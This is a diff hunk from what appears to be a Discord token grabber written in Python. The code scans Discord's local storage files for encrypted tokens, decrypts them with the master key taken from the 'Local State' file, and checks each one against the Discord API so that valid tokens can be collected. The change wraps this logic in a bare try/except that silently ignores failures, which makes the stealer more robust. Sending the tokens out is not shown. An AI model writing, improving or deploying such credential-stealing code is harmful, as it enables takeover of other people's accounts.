@@ -329,16 +329,19 @@ class Discord:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
-                                r = requests.get(self.baseurl, headers={
-                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                                    'Content-Type': 'application/json',
-                                    'Authorization': token})
-                                if r.status_code == 200:
-                                    uid = r.json()['id']
-                                    if uid not in self.ids:
-                                        self.tokens.append(token)
-                                        self.ids.append(uid)
+                                try:
+                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                    r = requests.get(self.baseurl, headers={
+                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+                                        'Content-Type': 'application/json',
+                                        'Authorization': token})
+                                    if r.status_code == 200:
+                                        uid = r.json()['id']
+                                        if uid not in self.ids:
+                                            self.tokens.append(token)
+                                            self.ids.append(uid)
+                                except:
+                                    pass
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
